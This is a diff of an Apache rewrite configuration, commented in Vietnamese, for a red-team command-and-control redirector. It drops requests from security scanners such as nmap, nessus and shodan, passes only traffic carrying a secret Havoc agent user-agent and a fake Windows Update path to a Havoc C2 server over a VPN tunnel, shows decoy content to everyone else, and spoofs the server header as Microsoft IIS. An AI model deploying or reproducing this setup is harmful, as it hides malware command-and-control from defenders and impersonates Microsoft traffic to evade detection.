@@ -1,35 +1,35 @@
-###########################################################
-# RED TEAM REDIRECTOR - APACHE CONFIGURATION
-###########################################################
-
+# ----------------------------------------------------------------------
+# OPSEC REDIRECTOR: FRONTEND (10.8.0.1) -> HAVOC (10.8.0.2)
+# ----------------------------------------------------------------------
 RewriteEngine On
 
-# [PHẦN 1] - ANTI-ANALYSIS & CLOAKING
-# Chặn các User-Agent từ các máy quét tự động và giới phân tích
-RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap|censys|shodan).* [NC]
+# [PHẦN 1] - BẨY MÁY QUÉT (SOC TOOLS)
+# Nếu phát hiện User-Agent của máy quét, trả về 403 Forbidden ngay lập tức
+RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|censys|shodan|zgrab|masscan).* [NC]
 RewriteRule ^.*$ - [F,L]
 
-# [PHẦN 2] - ĐIỀU KIỆN LỌC BEACON (CONDITIONAL REDIRECTION)
-# Chỉ những Request thỏa mãn đồng thời 2 điều kiện dưới đây mới được vào C2
-# 1. Khớp User-Agent bí mật (đã cài đặt trong Havoc)
+# [PHẦN 2] - ĐỊNH DANH ATTACKER (SECRET KNOCK)
+# 1. Kiểm tra User-Agent bí mật của Havoc Agent
 RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]
-
-# 2. Khớp URI giả lập Windows Update
+# 2. Kiểm tra URI bí mật (Giả lập Windows Update)
 RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]
 
-# [PHẦN 3] - PROXY VÀO VPN TUNNEL
-# Đẩy traffic qua interface tun0 tới Kali 2
-# [P] = Proxy, [L] = Last Rule, [NE] = No Escape
-RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]
+# [HÀNH ĐỘNG] - ĐẨY VÀO TUNNEL VPN TỚI HAVOC (10.8.0.2)
+# Sử dụng Proxy [P] để giấu IP thật của Havoc phía sau
+RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L]
 
-# [PHẦN 4] - FALLBACK (MẶT NẠ CHO SOC/GUEST)
-# Tất cả các truy cập không hợp lệ sẽ bị đẩy về website thật của Microsoft
-RewriteRule ^.*$ https://www.microsoft.com [R=302,L]
+# [PHẦN 3] - HIỂN THỊ FRONTEND CHO SOC (CLOAKING)
+# Nếu không phải Attacker, hiển thị website giới thiệu (index.html) trong /var/www/html/
+# Điều này khiến SOC tin rằng đây là một Web server thông thường
+RewriteRule ^$ index.html [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.html [L]
 
-# [PHẦN 5] - XÓA DẤU VẾT SERVER (FINGERPRINTING)
-# Giả dạng Apache thành IIS 10.0 của Windows Server
-Header unset X-Powered-By
-Header unset Server
-Header set Server "Microsoft-IIS/10.0"
-Header set X-Content-Type-Options "nosniff"
-
+# [PHẦN 4] - GIẢ MẠO FINGERPRINT
+# Ép Header trả về giống hệt server Microsoft IIS 10.0
+<IfModule mod_headers.c>
+    Header unset X-Powered-By
+    Header unset Server
+    Header set Server "Microsoft-IIS/10.0"
+</IfModule>
